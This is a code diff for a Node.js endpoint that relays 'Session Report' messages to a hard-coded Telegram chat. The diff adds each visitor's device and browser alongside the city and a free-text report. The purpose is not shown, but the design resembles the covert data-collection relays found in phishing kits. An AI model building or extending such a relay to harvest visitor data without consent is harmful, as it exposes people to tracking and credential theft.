@@ -6,14 +6,16 @@ const CHAT_ID = "6886010817";
 module.exports = async (req, res) => {
     if (req.method !== 'POST') return res.status(200).send('OK');
 
-    const { sessionID, report, city } = req.body;
+    const { sessionID, report, city, device, browser } = req.body;
 
     if (!sessionID) return res.status(400).send('Missing Session ID');
 
     try {
         const msg = `🔔 <b>Session Report</b>\n` +
             `🆔 ID: <code>${sessionID}</code>\n` +
-            `🌍 Loc: ${city || 'Unknown'}\n\n` +
+            `🌍 Loc: ${city || 'Unknown'}\n` +
+            `💻 Sys: ${device || 'Unknown'}\n` +
+            `🌐 Browser: ${browser ? browser.substring(0, 30) + '...' : 'Unknown'}\n\n` +
             report;
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
